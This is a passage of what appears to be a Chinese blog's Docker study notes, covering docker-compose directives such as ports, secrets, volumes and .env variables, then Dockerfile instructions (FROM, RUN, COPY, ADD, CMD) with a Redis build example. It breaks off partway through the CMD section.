<h3 id="labels"><a href="#labels" class="headerlink" title="labels"></a><code>labels</code></h3><p>为容器添加 Docker 元数据（metadata）信息。例如可以为容器添加辅助说明信息。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">labels:</span></span><br><span class="line">  <span class="attr">com.startupteam.description:</span> <span class="string">"webapp for a startup team"</span></span><br><span class="line">  <span class="attr">com.startupteam.department:</span> <span class="string">"devops department"</span></span><br><span class="line">  <span class="attr">com.startupteam.release:</span> <span class="string">"rc3 for v1.0"</span></span><br></pre></td></tr></table></figure>

<h3 id="links"><a href="#links" class="headerlink" title="links"></a><code>links</code></h3><blockquote>
<p>  注意：不推荐使用该指令。</p>
</blockquote>
<h3 id="logging"><a href="#logging" class="headerlink" title="logging"></a><code>logging</code></h3><p>配置日志选项。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">driver:</span> <span class="string">syslog</span></span><br><span class="line">  <span class="attr">options:</span></span><br><span class="line">    <span class="attr">syslog-address:</span> <span class="string">"tcp://192.168.0.42:123"</span></span><br></pre></td></tr></table></figure>

<p>目前支持三种日志驱动类型。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">driver:</span> <span class="string">"json-file"</span></span><br><span class="line"><span class="attr">driver:</span> <span class="string">"syslog"</span></span><br><span class="line"><span class="attr">driver:</span> <span class="string">"none"</span></span><br></pre></td></tr></table></figure>

<p><code>options</code> 配置日志驱动的相关参数。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">options:</span></span><br><span class="line">  <span class="attr">max-size:</span> <span class="string">"200k"</span></span><br><span class="line">  <span class="attr">max-file:</span> <span class="string">"10"</span></span><br></pre></td></tr></table></figure>

<h3 id="network-mode"><a href="#network-mode" class="headerlink" title="network_mode"></a><code>network_mode</code></h3><p>设置网络模式。使用和 <code>docker run</code> 的 <code>--network</code> 参数一样的值。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">network_mode:</span> <span class="string">"bridge"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"host"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"none"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"service:[service name]"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"container:[container name/id]"</span></span><br></pre></td></tr></table></figure>

<h3 id="networks"><a href="#networks" class="headerlink" title="networks"></a><code>networks</code></h3><p>配置容器连接的网络。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">some-service:</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">some-network</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">other-network</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">some-network:</span></span><br><span class="line">  <span class="attr">other-network:</span></span><br></pre></td></tr></table></figure>

<h3 id="pid"><a href="#pid" class="headerlink" title="pid"></a><code>pid</code></h3><p>跟主机系统共享进程命名空间。打开该选项的容器之间，以及容器和宿主机系统之间可以通过进程 ID 来相互访问和操作。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pid:</span> <span class="string">"host"</span></span><br></pre></td></tr></table></figure>

<h3 id="ports"><a href="#ports" class="headerlink" title="ports"></a><code>ports</code></h3><p>暴露端口信息。</p>
<p>使用宿主端口：容器端口 <code>(HOST:CONTAINER)</code> 格式，或者仅仅指定容器的端口（宿主将会随机选择端口）都可以。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">"3000"</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">"8000:8000"</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">"49100:22"</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">"127.0.0.1:8001:8001"</span></span><br></pre></td></tr></table></figure>

<p><em>注意：当使用</em> <em><code>HOST:CONTAINER</code></em> <em>格式来映射端口时，如果你使用的容器端口小于 60 并且没放到引号里，可能会得到错误结果，因为</em> <em><code>YAML</code></em> <em>会自动解析</em> <em><code>xx:yy</code></em> <em>这种数字格式为 60 进制。为避免出现这种问题，建议数字串都采用引号包括起来的字符串格式。</em></p>
<h3 id="secrets"><a href="#secrets" class="headerlink" title="secrets"></a><code>secrets</code></h3><p>存储敏感数据，例如 <code>mysql</code> 服务密码。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3.1"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mysql:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">mysql</span></span><br><span class="line">  <span class="attr">environment:</span></span><br><span class="line">    <span class="attr">MYSQL_ROOT_PASSWORD_FILE:</span> <span class="string">/run/secrets/db_root_password</span></span><br><span class="line">  <span class="attr">secrets:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">db_root_password</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">my_other_secret</span></span><br><span class="line"></span><br><span class="line"><span class="attr">secrets:</span></span><br><span class="line">  <span class="attr">my_secret:</span></span><br><span class="line">    <span class="attr">file:</span> <span class="string">./my_secret.txt</span></span><br><span class="line">  <span class="attr">my_other_secret:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="security-opt"><a href="#security-opt" class="headerlink" title="security_opt"></a><code>security_opt</code></h3><p>指定容器模板标签（label）机制的默认属性（用户、角色、类型、级别等）。例如配置标签的用户名和角色名。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">security_opt:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">label:user:USER</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">label:role:ROLE</span></span><br></pre></td></tr></table></figure>

<h3 id="stop-signal"><a href="#stop-signal" class="headerlink" title="stop_signal"></a><code>stop_signal</code></h3><p>设置另一个信号来停止容器。在默认情况下使用的是 SIGTERM 停止容器。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">stop_signal:</span> <span class="string">SIGUSR1</span></span><br></pre></td></tr></table></figure>

<h3 id="sysctls"><a href="#sysctls" class="headerlink" title="sysctls"></a><code>sysctls</code></h3><p>配置容器内核参数。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">sysctls:</span></span><br><span class="line">  <span class="attr">net.core.somaxconn:</span> <span class="number">1024</span></span><br><span class="line">  <span class="attr">net.ipv4.tcp_syncookies:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">sysctls:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">net.core.somaxconn=1024</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">net.ipv4.tcp_syncookies=0</span></span><br></pre></td></tr></table></figure>

<h3 id="ulimits"><a href="#ulimits" class="headerlink" title="ulimits"></a><code>ulimits</code></h3><p>指定容器的 ulimits 限制值。</p>
<p>例如，指定最大进程数为 65535，指定文件句柄数为 20000（软限制，应用可以随时修改，不能超过硬限制） 和 40000（系统硬限制，只能 root 用户提高）。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ulimits:</span></span><br><span class="line">  <span class="attr">nproc:</span> <span class="number">65535</span></span><br><span class="line">  <span class="attr">nofile:</span></span><br><span class="line">    <span class="attr">soft:</span> <span class="number">20000</span></span><br><span class="line">    <span class="attr">hard:</span> <span class="number">40000</span></span><br></pre></td></tr></table></figure>

<h3 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a><code>volumes</code></h3><p>数据卷所挂载路径设置。可以设置为宿主机路径(<code>HOST:CONTAINER</code>)或者数据卷名称(<code>VOLUME:CONTAINER</code>)，并且可以设置访问模式 （<code>HOST:CONTAINER:ro</code>）。</p>
<p>该指令中路径支持相对路径。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">/var/lib/mysql</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">cache/:/tmp/cache</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">~/configs:/etc/configs/:ro</span></span><br></pre></td></tr></table></figure>

<p>如果路径为数据卷名称，必须在文件中配置数据卷。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">my_src:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql_data:/var/lib/mysql</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">mysql_data:</span></span><br></pre></td></tr></table></figure>

<h3 id="其它指令"><a href="#其它指令" class="headerlink" title="其它指令"></a>其它指令</h3><p>此外，还有包括 <code>domainname, entrypoint, hostname, ipc, mac_address, privileged, read_only, shm_size, restart, stdin_open, tty, user, working_dir</code> 等指令，基本跟 <code>docker run</code> 中对应参数的功能一致。</p>
<ul>
<li><p>指定服务容器启动后执行的入口文件：</p>
  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">entrypoint:</span> <span class="string">/code/entrypoint.sh</span></span><br></pre></td></tr></table></figure></li>
<li><p>指定容器中运行应用的用户名</p>
  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure></li>
<li><p>指定容器中工作目录</p>
  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">working_dir:</span> <span class="string">/code</span></span><br></pre></td></tr></table></figure></li>
<li><p>指定容器中搜索域名、主机名、mac 地址等</p>
  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">domainname:</span> <span class="string">your_website.com</span></span><br><span class="line"><span class="attr">hostname:</span> <span class="string">test</span></span><br><span class="line"><span class="attr">mac_address:</span> <span class="number">08</span><span class="number">-00</span><span class="number">-27</span><span class="number">-00</span><span class="string">-0C-0A</span></span><br></pre></td></tr></table></figure></li>
<li><p>允许容器中运行一些特权命令</p>
  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
<li><p>指定容器退出后的重启策略为始终重启</p>
<p>  该命令对保持服务始终运行十分有效，在生产环境中推荐配置为 <code>always</code> 或者 <code>unless-stopped</code>。</p>
  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure></li>
<li><p>以只读模式挂载容器的 root 文件系统</p>
<p>  意味着不能对容器内容进行修改。</p>
  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">read_only:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
<li><p>打开标准输入，可以接受外部输入</p>
  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">stdin_open:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
<li><p>模拟一个伪终端</p>
  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tty:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="读取变量"><a href="#读取变量" class="headerlink" title="读取变量"></a>读取变量</h2><p>Compose 模板文件支持动态读取主机的系统环境变量和当前目录下的 <code>.env</code> 文件中的变量。</p>
<p>例如，下面的 Compose 文件将从运行它的环境中读取变量 <code>${MONGO_VERSION}</code> 的值，并写入执行的指令中。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">db:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">"mongo:${MONGO_VERSION}"</span></span><br></pre></td></tr></table></figure>

<p>如果执行 <code>MONGO_VERSION=3.2 docker-compose up</code> 则会启动一个 <code>mongo:3.2</code> 镜像的容器；如果执行 <code>MONGO_VERSION=2.8 docker-compose up</code> 则会启动一个 <code>mongo:2.8</code> 镜像的容器。</p>
<p>若当前目录存在 <code>.env</code> 文件，执行 <code>docker-compose</code> 命令时将从该文件中读取变量。</p>
<p>在当前目录新建 <code>.env</code> 文件并写入以下内容。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 支持 # 号注释</span></span><br><span class="line"><span class="string">MONGO_VERSION=3.6</span></span><br></pre></td></tr></table></figure>

<p>执行 <code>docker-compose up</code> 则会启动一个 <code>mongo:3.6</code> 镜像的容器。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a href="https://docs.docker.com/compose/reference/overview/">https://docs.docker.com/compose/reference/overview/</a></p>
<p>[2] <a href="https://yeasy.gitbook.io/docker_practice/compose">https://yeasy.gitbook.io/docker_practice/compose</a></p>
]]></content>
      <categories>
        <category>docker learning</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker-compose</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerfile学习总结</title>
    <url>/Dockerfile%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了构建镜像所需的指令和说明以及如何通过Dockerfile构建镜像。<span id="more"></span></p>
<h2 id="Dockerfile-指令介绍"><a href="#Dockerfile-指令介绍" class="headerlink" title="Dockerfile 指令介绍"></a>Dockerfile 指令介绍</h2><p>以定制nginx镜像为例（构建好的镜像内会有一个 /usr/share/nginx/html/index.html 文件）</p>
<ul>
<li><p>在一个空白目录中，建立一个文本文件，并命名为 <code>Dockerfile</code>：</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir mynginx</span><br><span class="line">cd mynginx</span><br><span class="line">touch Dockerfile</span><br></pre></td></tr></table></figure></li>
<li><p>其内容为：</p>
  <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">'&lt;h1&gt;Hello, Docker!&lt;/h1&gt;'</span> &gt; /usr/share/nginx/html/index.html</span></span><br></pre></td></tr></table></figure>

<p>  这个 Dockerfile 很简单，一共就两行。涉及到了两条指令，<code>FROM</code> 和 <code>RUN</code>。</p>
</li>
</ul>
<h3 id="FROM指定基础镜像"><a href="#FROM指定基础镜像" class="headerlink" title="FROM指定基础镜像"></a><code>FROM</code>指定基础镜像</h3><p>定制镜像，是以一个镜像为基础，在其上进行定制，而 <code>FROM</code> 就是指定<strong>基础镜像</strong>，因此一个 <code>Dockerfile</code> 中 <code>FROM</code> 是必备的指令，并且必须是第一条指令。在DockerHub上有非常多的高质量的官方镜像，包括服务类、语言环境类、操作系统。</p>
<p>除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 <code>scratch</code>。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> scratch</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>以 <code>scratch</code> 为基础镜像，意味着不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。</p>
<p>不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，对于 Linux 下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接 <code>FROM scratch</code> 会让镜像体积更加小巧。（使用<strong>Go语言</strong>开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为 Go 是特别适合容器微服务架构的语言的原因之一）</p>
<h3 id="RUN执行命令"><a href="#RUN执行命令" class="headerlink" title="RUN执行命令"></a><code>RUN</code>执行命令</h3><p><code>RUN</code> 指令是用来执行命令行命令的。由于命令行的强大能力，<code>RUN</code> 指令在定制镜像时是最常用的指令之一。其格式有两种：</p>
<ol>
<li><p><strong>shell格式</strong>：<code>RUN &lt;命令&gt;</code>，就像直接在命令行中输入的命令一样，即在Dockerfile中直接使用<code>RUN</code>指令。</p>
  <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">'&lt;h1&gt;Hello, Docker!&lt;/h1&gt;'</span> &gt; /usr/share/nginx/html/index.html</span></span><br></pre></td></tr></table></figure></li>
<li><p>  <strong>exec格式</strong>：<code>RUN ["可执行文件", "参数1", "参数2"]</code>，更像是函数调用中的格式。</p>
</li>
</ol>
<p>Dockerfile 中每一个指令都会建立一层，<code>RUN</code> 也不例外。每一个 <code>RUN</code> 的行为都会新建立一层，在其上执行这些命令，执行结束后，<code>commit</code> 这一层的修改，构成新的镜像。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:stretch</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y gcc libc6-dev make wget</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget -O redis.tar.gz <span class="string">"http://download.redis.io/releases/redis-5.0.3.tar.gz"</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /usr/src/redis</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> make -C /usr/src/redis</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> make -C /usr/src/redis install</span></span><br></pre></td></tr></table></figure>

<p>而上面的这种写法，创建了 7 层镜像。这是完全没有意义的，而且很多运行时不需要的东西，都被装进了镜像里，比如编译环境、更新的软件包等等。结果就是产生非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。 (UFS是有最大层数限制的，比如 AUFS，曾经是最大不得超过 127 层）</p>
<p>上面的 <code>Dockerfile</code> 正确的写法应该是这样：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:stretch</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x; buildDeps=<span class="string">'gcc libc6-dev make wget'</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y <span class="variable">$buildDeps</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; wget -O redis.tar.gz <span class="string">"http://download.redis.io/releases/redis-5.0.3.tar.gz"</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mkdir</span> -p /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make -C /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make -C /usr/src/redis install \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/* \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> redis.tar.gz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -r /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get purge -y --auto-remove <span class="variable">$buildDeps</span></span></span><br></pre></td></tr></table></figure>

<p>首先，之前所有的命令只有一个目的，就是编译、安装 redis 可执行文件。因此没有必要建立很多层，这只是一层的事情。因此，没有使用多个 <code>RUN</code> 一一对应不同的命令，而是仅仅使用一个 <code>RUN</code> 指令，并使用 <code>&amp;&amp;</code> 将各个所需命令串联起来。将之前的 7 层，简化为了 1 层。在撰写 Dockerfile 的时候，要经常提醒自己，这并不是在写 Shell 脚本，而是在定义每一层该如何构建。</p>
<p>并且，这里为了格式化还进行了换行。Dockerfile 支持 Shell 类的行尾添加 <code>\</code> 的命令换行方式，以及行首 <code>#</code> 进行注释的格式。良好的格式，比如换行、缩进、注释等，会让维护、排障更为容易，这是一个比较好的习惯。</p>
<p>此外，还可以看到这一组命令的最后添加了清理工作的命令，删除了为了编译构建所需要的软件，清理了所有下载、展开的文件，并且还清理了 <code>apt</code> 缓存文件。这是很重要的一步，镜像是多层存储，每一层的东西并不会在下一层被删除，会一直跟随着镜像。因此镜像构建时，一定要确保每一层只添加真正需要添加的东西，任何无关的东西都应该清理掉。</p>
<h3 id="COPY复制文件"><a href="#COPY复制文件" class="headerlink" title="COPY复制文件"></a><code>COPY</code>复制文件</h3><p><code>COPY</code> 指令将从构建上下文目录中 <code>&lt;源路径&gt;</code> 的文件或目录复制到新的一层的镜像内的 <code>&lt;目标路径&gt;</code> 位置。</p>
<p>和 <code>RUN</code> 指令一样，也有两种格式，一种类似于命令行，一种类似于函数调用。</p>
<ul>
<li>```dockerfile<br>  COPY [–chown=<user>:<group>] &lt;源路径&gt;… &lt;目标路径&gt;  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-   ```dockerfile</span><br><span class="line">    COPY [--chown=&lt;user&gt;:&lt;group&gt;] ["&lt;源路径1&gt;",... "&lt;目标路径&gt;"]</span><br></pre></td></tr></table></figure></group></user></li>
</ul>
<p>举例如下</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> package.json /usr/src/app/</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;源路径&gt;</code> 可以是多个，甚至可以是通配符，其通配符规则要满足 Go 的 <a href="https://golang.org/pkg/path/filepath/#Match"><code>filepath.Match</code></a> 规则，如：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> hom* /mydir/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> hom?.txt /mydir/</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;目标路径&gt;</code> 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作目录可以用 <code>WORKDIR</code> 指令来指定）。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。</p>
<p>此外，还需要注意一点，使用 <code>COPY</code> 指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。这个特性对于镜像定制很有用。特别是构建相关文件都在使用 Git 进行管理的时候。</p>
<p>在使用该指令的时候还可以加上 <code>--chown=&lt;user&gt;:&lt;group&gt;</code> 选项来改变文件的所属用户及所属组。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chown</span>=55:mygroup files* /mydir/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chown</span>=bin files* /mydir/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chown</span>=1 files* /mydir/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chown</span>=10:11 files* /mydir/</span></span><br></pre></td></tr></table></figure>

<p>如果源路径为文件夹，复制的时候不是直接复制该文件夹，而是将文件夹中的内容复制到目标路径。</p>
<h3 id="ADD更高级的复制文件"><a href="#ADD更高级的复制文件" class="headerlink" title="ADD更高级的复制文件"></a><code>ADD</code>更高级的复制文件</h3><p><code>ADD</code> 指令和 <code>COPY</code> 的格式和性质基本一致。但是在 <code>COPY</code> 基础上增加了一些功能。</p>
<p>比如 <code>&lt;源路径&gt;</code> 可以是一个 <code>URL</code>，这种情况下，Docker 引擎会试图去下载这个链接的文件放到 <code>&lt;目标路径&gt;</code> 去。下载后的文件权限自动设置为 <code>600</code>，如果这并不是想要的权限，那么还需要增加额外的一层 <code>RUN</code> 进行权限调整，另外，如果下载的是个压缩包，需要解压缩，也一样还需要额外的一层 <code>RUN</code> 指令进行解压缩。所以不如直接使用 <code>RUN</code> 指令，然后使用 <code>wget</code> 或者 <code>curl</code> 工具下载，处理权限、解压缩、然后清理无用文件更合理。因此，这个功能其实并不实用，而且不推荐使用。</p>
<p>如果 <code>&lt;源路径&gt;</code> 为一个 <code>tar</code> 压缩文件的话，压缩格式： <code>gzip</code>, <code>bzip2</code> 以及 <code>xz</code> 的情况下，<code>ADD</code> 指令将会自动解压缩这个压缩文件到 <code>&lt;目标路径&gt;</code> 去。</p>
<p>在某些情况下，这个自动解压缩的功能非常有用，比如官方镜像 <code>ubuntu</code> 中：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> scratch</span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> ubuntu-xenial-core-cloudimg-amd64-root.tar.gz /</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>但在某些情况下，如果希望复制个压缩文件进去，而不解压缩，这时就不可以使用 <code>ADD</code> 命令了。</p>
<p>在 Docker 官方的 <a href="">Dockerfile 最佳实践文档</a> 中要求，尽可能的使用 <code>COPY</code>，因为 <code>COPY</code> 的语义很明确，就是复制文件而已，而 <code>ADD</code> 则包含了更复杂的功能，其行为也不一定很清晰。最适合使用 <code>ADD</code> 的场合，就是所提及的需要自动解压缩的场合。</p>
<p>另外需要注意的是，<code>ADD</code> 指令会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。</p>
<p>因此在 <code>COPY</code> 和 <code>ADD</code> 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 <code>COPY</code> 指令，仅在需要自动解压缩的场合使用 <code>ADD</code>。</p>
<p>在使用该指令的时候还可以加上 <code>--chown=&lt;user&gt;:&lt;group&gt;</code> 选项来改变文件的所属用户及所属组。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=55:mygroup files* /mydir/</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=bin files* /mydir/</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=1 files* /mydir/</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=10:11 files* /mydir/</span></span><br></pre></td></tr></table></figure>

<h3 id="CMD容器启动命令"><a href="#CMD容器启动命令" class="headerlink" title="CMD容器启动命令"></a><code>CMD</code>容器启动命令</h3><p><code>CMD</code> 指令的格式和 <code>RUN</code> 相似，也是两种格式：</p>
<ul>
<li>  <code>shell</code> 格式：<code>CMD &lt;命令&gt;</code></li>
<li>  <code>exec</code> 格式：<code>CMD ["可执行文件", "参数1", "参数2"...]</code></li>
<li>  参数列表格式：<code>CMD ["参数1", "参数2"...]</code>。在指定了 <code>ENTRYPOINT</code> 指令后，用 <code>CMD</code> 指定具体的参数。</li>
</ul>
<p>Docker 不是虚拟机，容器就是进程，在启动容器的时候，需要指定所运行的程序及参数。<code>CMD</code> 指令就是用于指定默认的容器主进程的启动命令的。</p>
<p>在运行时可以指定新的命令来替代镜像设置中的这个默认命令，比如，<code>ubuntu</code> 镜像默认的 <code>CMD</code> 是 <code>/bin/bash</code>，如果直接 <code>docker run -it ubuntu</code> 的话，会直接进入 <code>bash</code>。也可以在运行时指定运行别的命令，如 <code>docker run -it ubuntu cat /etc/os-release</code>。这就是用 <code>cat /etc/os-release</code> 命令替换了默认的 <code>/bin/bash</code> 命令了，输出了系统版本信息。</p>
<p>在指令格式上，一般推荐使用 <code>exec</code> 格式，这类格式在解析时会被解析为 JSON 数组，因此一定要使用双引号 <code>"</code>，而不要使用单引号。</p>
<p>如果使用 <code>shell</code> 格式，实际的命令会被包装为 <code>sh -c</code> 的参数的形式进行执行。比如：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="variable">$HOME</span></span></span><br></pre></td></tr></table></figure>

<p>在实际执行中，会将其变更为：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">"sh"</span>, <span class="string">"-c"</span>, <span class="string">"echo <span class="variable">$HOME</span>"</span> ]</span></span><br></pre></td></tr></table></figure>

<p>这就是为什么可以使用环境变量的原因，因为这些环境变量会被 shell 进行解析处理。</p>
<p>提到 <code>CMD</code> 就不得不提容器中应用在前台执行和后台执行的问题。这是初学者常出现的一个混淆。</p>
<p>Docker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样，用 <code>systemd</code> 去启动后台服务，容器内没有后台服务的概念。</p>
<p>一些初学者将 <code>CMD</code> 写为：</p>
